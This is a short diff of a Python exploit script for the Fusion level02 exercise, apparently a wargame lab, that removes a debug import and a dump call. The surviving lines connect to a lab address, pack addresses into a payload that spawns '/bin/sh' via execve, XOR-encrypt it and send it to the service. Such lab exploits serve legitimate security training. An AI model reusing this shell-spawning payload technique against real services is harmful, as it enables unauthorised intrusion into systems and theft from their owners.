@@ -1,5 +1,5 @@
 # exploit-ex fusion level02
-from err0rless import connst, dump
+from err0rless import connst
 from struct import pack
 
 s, t = connst("192.168.95.152", 20002)
@@ -38,8 +38,6 @@ def pMain():
     p += pack("I", 0x0804B48C)
     p += pack("I", 0x00000000)
     # execve("/bin/sh", {"/bin/sh", 0}, 0);
-
-    dump(pack("I", len(p)))
 
     s.send("E" + pack("I", len(p)) + cipher(p, xorkey) + "Q")
     print t.read_until("\x8C\xB4\x04\x08")
